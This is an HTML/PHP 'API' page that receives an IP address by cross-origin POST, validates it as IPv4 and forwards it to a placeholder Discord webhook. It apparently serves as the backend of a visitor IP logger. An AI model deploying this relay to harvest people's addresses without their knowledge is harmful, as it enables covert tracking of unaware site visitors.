<!DOCTYPE html>
<html>
<head>
<link href="style.css" rel="stylesheet" />
<title>API</title>
<script src="darkmode.min.js"></script>
</head>
<body>

<h1>You have reached the api. </h1>

<?php
$result = 'not a post request';
header("Access-Control-Allow-Origin: https://yourdomain.com");
header("Access-Control-Allow-Methods: POST, GET");
header("Access-Control-Allow-Headers: Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers");

function SendToWebhook($result)
{
    $webhookUrl = 'your discord webhook url';

    $data = array(
        'content' => $result
    );
    
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ),
    );
    
    $context = stream_context_create($options);
    
    $result = file_get_contents($webhookUrl, false, $context);
    
    if ($result === false) {
        echo "Error: " . $result;
    } else {
        echo $result;
    }
}

function validate_ip($s) {
    $a = explode('.', $s);
    if (count($a) !== 4) {
        return false;
    }
    foreach ($a as $x) {
        if (!is_numeric($x)) {
            return false;
        }
        $i = intval($x);
        if ($i < 0 || $i > 255) {
            return false;
        }
    }
    return true;
}

if($_SERVER["REQUEST_METHOD"] == "POST"){
    $_POST = json_decode(file_get_contents('php://input'), true);
    $result = $_POST["ip"];
    if (validate_ip($result)) {
        SendToWebhook($result);
    }
}


?>
<script>
const options = {
  bottom: '64px', // default: '32px'
  right: 'unset', // default: '32px'
  left: '32px', // default: 'unset'
  time: '0.5s', // default: '0.3s'
  mixColor: '#fff', // default: '#fff'
  backgroundColor: '#fff',  // default: '#fff'
  buttonColorDark: '#100f2c',  // default: '#100f2c'
  buttonColorLight: '#fff', // default: '#fff'
  saveInCookies: false, // default: true,
  label: '🌓', // default: ''
  autoMatchOsTheme: true // default: true
}

const darkmode = new Darkmode(options);
darkmode.showWidget();
</script>
</body>
</html> 